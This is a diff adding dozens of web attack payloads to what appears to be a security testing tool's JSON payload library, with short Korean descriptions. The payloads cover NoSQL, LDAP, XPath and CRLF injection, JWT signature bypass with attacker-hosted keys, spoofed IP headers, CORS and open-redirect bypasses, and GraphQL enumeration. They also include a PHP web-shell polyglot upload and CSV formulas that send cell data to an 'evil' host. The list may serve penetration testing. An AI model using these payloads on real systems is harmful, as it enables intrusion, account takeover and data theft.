+          "payload": "{\"$where\":\"this.pass=='x'||'1'=='1'\"}",
+          "description": "JS 조건 우회",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/nosql-injection"
+        },
+        {
+          "id": "nosql_17",
+          "name": "URL $ne",
+          "payload": "user[$ne]=&pass[$ne]=",
+          "description": "쿼리스트링 연산자",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
+        },
+        {
+          "id": "nosql_18",
+          "name": "$gt 시간블라인드",
+          "payload": "{\"$where\":\"sleep(3000)||true\"}",
+          "description": "time-based",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/nosql-injection"
+        },
+        {
+          "id": "nosql_19",
+          "name": "$exists",
+          "payload": "{\"user\":{\"$exists\":true},\"pass\":{\"$gt\":\"\"}}",
+          "description": "존재 조건",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
         }
       ],
       "group": "server"
@@ -1803,6 +2643,54 @@
           "description": "헤더 인젝션 리다이렉트",
           "risk": "high",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect"
+        },
+        {
+          "id": "redir_17",
+          "name": "///evil",
+          "payload": "///evil.example.com",
+          "description": "슬래시 3개",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect"
+        },
+        {
+          "id": "redir_18",
+          "name": "백슬래시",
+          "payload": "https:/\\evil.example.com",
+          "description": "혼합 슬래시",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/open-redirect"
+        },
+        {
+          "id": "redir_19",
+          "name": "@우회",
+          "payload": "https://legit.com@evil.example.com",
+          "description": "userinfo 혼동",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect"
+        },
+        {
+          "id": "redir_20",
+          "name": "역슬래시2",
+          "payload": "\\/\\/evil.example.com",
+          "description": "역슬래시 우회",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/open-redirect"
+        },
+        {
+          "id": "redir_21",
+          "name": "널바이트",
+          "payload": "https://evil.example.com%00.legit.com",
+          "description": "널바이트 절단",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/open-redirect"
+        },
+        {
+          "id": "redir_22",
+          "name": "점 우회",
+          "payload": "https://evil.example.com。",
+          "description": "유니코드 점",
+          "risk": "low",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/open-redirect"
         }
       ],
       "group": "client"
@@ -1910,6 +2798,54 @@
           "description": "self-signed 키 임베드",
           "risk": "high",
           "reference": "https://portswigger.net/web-security/jwt"
+        },
+        {
+          "id": "jwt_14",
+          "name": "alg none 소문자",
+          "payload": "{\"alg\":\"none\",\"typ\":\"JWT\"}",
+          "description": "서명 제거",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token"
+        },
+        {
+          "id": "jwt_15",
+          "name": "빈 서명",
+          "payload": "<header>.<payload>.",
+          "description": "서명부 공백",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/jwt"
+        },
+        {
+          "id": "jwt_16",
+          "name": "kid null",
+          "payload": "{\"kid\":\"/dev/null\",\"alg\":\"HS256\"}",
+          "description": "null 키로 서명",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/jwt"
+        },
+        {
+          "id": "jwt_17",
+          "name": "kid path",
+          "payload": "{\"kid\":\"../../../../dev/null\"}",
+          "description": "경로 traversal",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/jwt"
+        },
+        {
+          "id": "jwt_18",
+          "name": "jku 외부",
+          "payload": "{\"alg\":\"RS256\",\"jku\":\"https://attacker.example/jwks.json\"}",
+          "description": "외부 JWKS",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/jwt"
+        },
+        {
+          "id": "jwt_19",
+          "name": "x5u 외부",
+          "payload": "{\"alg\":\"RS256\",\"x5u\":\"https://attacker.example/cert.pem\"}",
+          "description": "외부 인증서",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens"
         }
       ],
       "group": "auth"
@@ -2093,6 +3029,54 @@
           "name": "X-Forwarded-Proto",
           "payload": "X-Forwarded-Proto: http",
           "description": "HTTPS 강제 우회 시도",
+          "risk": "low",
+          "reference": "https://book.hacktricks.xyz/pentesting-web"
+        },
+        {
+          "id": "hdr_23",
+          "name": "X-Host",
+          "payload": "X-Host: evil.example.com",
+          "description": "대체 호스트",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/host-header"
+        },
+        {
+          "id": "hdr_24",
+          "name": "X-Forwarded-Server",
+          "payload": "X-Forwarded-Server: evil.example.com",
+          "description": "프록시 헤더",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web"
+        },
+        {
+          "id": "hdr_25",
+          "name": "X-Client-IP 우회",
+          "payload": "X-Client-IP: 127.0.0.1",
+          "description": "IP 기반 우회",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web"
+        },
+        {
+          "id": "hdr_26",
+          "name": "True-Client-IP",
+          "payload": "True-Client-IP: 127.0.0.1",
+          "description": "CDN IP 헤더",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web"
+        },
+        {
+          "id": "hdr_27",
+          "name": "X-Originating-IP",
+          "payload": "X-Originating-IP: 127.0.0.1",
+          "description": "원발신 IP 스푸핑",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web"
+        },
+        {
+          "id": "hdr_28",
+          "name": "Referer 우회",
+          "payload": "Referer: https://trusted.example.com",
+          "description": "리퍼러 검증 우회",
           "risk": "low",
           "reference": "https://book.hacktricks.xyz/pentesting-web"
         }
@@ -2285,6 +3269,38 @@
           "description": "AND 필터 조작",
           "risk": "medium",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection"
+        },
+        {
+          "id": "ldap_12",
+          "name": "blank 우회",
+          "payload": "*",
+          "description": "와일드카드 매칭",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection"
+        },
+        {
+          "id": "ldap_13",
+          "name": "attr 노출",
+          "payload": "*)(objectClass=*))(&(objectClass=void",
+          "description": "전체 속성",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection"
+        },
+        {
+          "id": "ldap_14",
+          "name": "AND 참",
+          "payload": "*)(&(1=1",
+          "description": "조건 조작",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection"
+        },
+        {
+          "id": "ldap_15",
+          "name": "blind 문자",
+          "payload": "admin*)(cn=a*",
+          "description": "이진 탐색",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ldap-injection"
         }
       ],
       "group": "server"
@@ -2436,6 +3452,30 @@
           "description": "할인 로직 악용",
           "risk": "medium",
           "reference": "https://owasp.org/www-project-web-security-testing-guide/"
+        },
+        {
+          "id": "biz_20",
+          "name": "IDOR 증가",
+          "payload": "id=1002 (원래 1001)",
+          "description": "인접 객체",
+          "risk": "high",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
+        },
+        {
+          "id": "biz_21",
+          "name": "mass assignment",
+          "payload": "isAdmin=true",
+          "description": "추가 필드 주입",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/parameter-pollution"
+        },
+        {
+          "id": "biz_22",
+          "name": "단계 스킵",
+          "payload": "step=confirm 직접호출",
+          "description": "워크플로우 우회",
+          "risk": "medium",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
         }
       ],
       "group": "auth"
@@ -2493,6 +3533,38 @@
           "description": "기본 인증우회",
           "risk": "high",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPath%20Injection"
+        },
+        {
+          "id": "xpath_07",
+          "name": "or true",
+          "payload": "' or 1=1 or 'a'='a",
+          "description": "항상 참",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPath%20Injection"
+        },
+        {
+          "id": "xpath_08",
+          "name": "노드 유출",
+          "payload": "'] | //* | ['",
+          "description": "전체 노드",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xpath-injection"
+        },
+        {
+          "id": "xpath_09",
+          "name": "blind position",
+          "payload": "' and string-length(name(/*[1]))=4 and 'a'='a",
+          "description": "루트 이름 길이",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xpath-injection"
+        },
+        {
+          "id": "xpath_10",
+          "name": "blind char",
+          "payload": "' and substring(//user[1]/pass,1,1)='a' and 'a'='a",
+          "description": "비번 이진탐색",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xpath-injection"
         }
       ],
       "group": "server"
@@ -2548,6 +3620,30 @@
           "name": "캐시 포이즈닝 결합",
           "payload": "%0d%0aContent-Length:%200%0d%0a%0d%0a",
           "description": "응답 경계 조작",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection"
+        },
+        {
+          "id": "crlf_07",
+          "name": "Set-Cookie",
+          "payload": "%0d%0aSet-Cookie:sessid=1",
+          "description": "쿠키 주입",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection"
+        },
+        {
+          "id": "crlf_08",
+          "name": "open redirect",
+          "payload": "%0d%0aLocation:https://evil.example",
+          "description": "리다이렉트",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection"
+        },
+        {
+          "id": "crlf_09",
+          "name": "XSS 본문",
+          "payload": "%0d%0a%0d%0a<svg onload=alert(1)>",
+          "description": "본문 주입",
           "risk": "high",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection"
         }
@@ -2607,6 +3703,38 @@
           "description": "ACAC:true 결합 시 탈취",
           "risk": "high",
           "reference": "https://portswigger.net/web-security/cors"
+        },
+        {
+          "id": "cors_07",
+          "name": "정규식 우회 dot",
+          "payload": "Origin: https://trustedXexample.com",
+          "description": "점을 임의문자로 매칭",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/cors-bypass"
+        },
+        {
+          "id": "cors_08",
+          "name": "http 다운그레이드",
+          "payload": "Origin: http://trusted.example.com",
+          "description": "프로토콜 검증 누락",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/cors"
+        },
+        {
+          "id": "cors_09",
+          "name": "포트 무시",
+          "payload": "Origin: https://trusted.example.com:1337",
+          "description": "포트 검증 누락",
+          "risk": "low",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/cors-bypass"
+        },
+        {
+          "id": "cors_10",
+          "name": "data null",
+          "payload": "Origin: null (via sandboxed iframe)",
+          "description": "null origin 유도",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/cors"
         }
       ],
       "group": "http"
@@ -2663,6 +3791,38 @@
           "payload": "{\"query\":\"{user(id:\\\"1' OR '1'='1\\\"){name}}\"}",
           "description": "리졸버 인자 인젝션",
           "risk": "high",
+          "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql"
+        },
+        {
+          "id": "graphql_07",
+          "name": "인트로스펙션 full",
+          "payload": "{\"query\":\"query IntrospectionQuery {__schema{queryType{name} mutationType{name} types{...FullType}}}\"}",
+          "description": "전체 스키마",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection"
+        },
+        {
+          "id": "graphql_08",
+          "name": "mutation 열거",
+          "payload": "{\"query\":\"{__schema{mutationType{fields{name args{name}}}}}\"}",
+          "description": "뮤테이션 열거",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql"
+        },
+        {
+          "id": "graphql_09",
+          "name": "필드 제안(오타)",
+          "payload": "{\"query\":\"{userr}\"}",
+          "description": "did-you-mean 정보 노출",
+          "risk": "low",
+          "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql"
+        },
+        {
+          "id": "graphql_10",
+          "name": "배치 brute",
+          "payload": "[{\"query\":\"mutation{login(pw:\\\"1\\\")}\"},{\"query\":\"mutation{login(pw:\\\"2\\\")}\"}]",
+          "description": "배칭 브루트",
+          "risk": "medium",
           "reference": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql"
         }
       ],
@@ -2786,6 +3946,46 @@
           "description": "저장 경로 조작",
           "risk": "high",
           "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files"
+        },
+        {
+          "id": "upload_09",
+          "name": "php 대체 확장 다수",
+          "payload": "shell.php3 / .php4 / .php7 / .pht / .phar",
+          "description": "php 대체 확장자",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files"
+        },
+        {
+          "id": "upload_10",
+          "name": "asp 확장",
+          "payload": "shell.asp;.jpg",
+          "description": "IIS 세미콜론 우회",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-upload"
+        },
+        {
+          "id": "upload_11",
+          "name": "jsp 확장",
+          "payload": "shell.jsp / .jspx",
+          "description": "JSP 업로드",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files"
+        },
+        {
+          "id": "upload_12",
+          "name": "공백/점 접미",
+          "payload": "shell.php. / shell.php ",
+          "description": "윈도우 트림 우회",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-upload"
+        },
+        {
+          "id": "upload_13",
+          "name": "이미지 폴리글랏",
+          "payload": "GIF89a<?php system($_GET[0]);?>",
+          "description": "GIF 헤더 폴리글랏",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/file-upload"
         }
       ],
       "group": "server"
@@ -3055,6 +4255,38 @@
           "description": "셀 데이터 외부 유출",
           "risk": "high",
           "reference": "https://owasp.org/www-project-web-security-testing-guide/"
+        },
+        {
+          "id": "csv_07",
+          "name": "+DDE",
+          "payload": "+cmd|'/C calc'!A0",
+          "description": "+ 접두 DDE",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection"
+        },
+        {
+          "id": "csv_08",
+          "name": "@SUM",
+          "payload": "@SUM(1+1)*cmd|'/C calc'!A0",
+          "description": "@ 접두 DDE",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection"
+        },
+        {
+          "id": "csv_09",
+          "name": "데이터 유출",
+          "payload": "=HYPERLINK(\"http://evil/\"&A1)",
+          "description": "셀 유출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection"
+        },
+        {
+          "id": "csv_10",
+          "name": "WEBSERVICE",
+          "payload": "=WEBSERVICE(\"http://evil/?d=\"&A1)",
+          "description": "외부 요청 유출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection"
         }
       ],
       "group": "client"
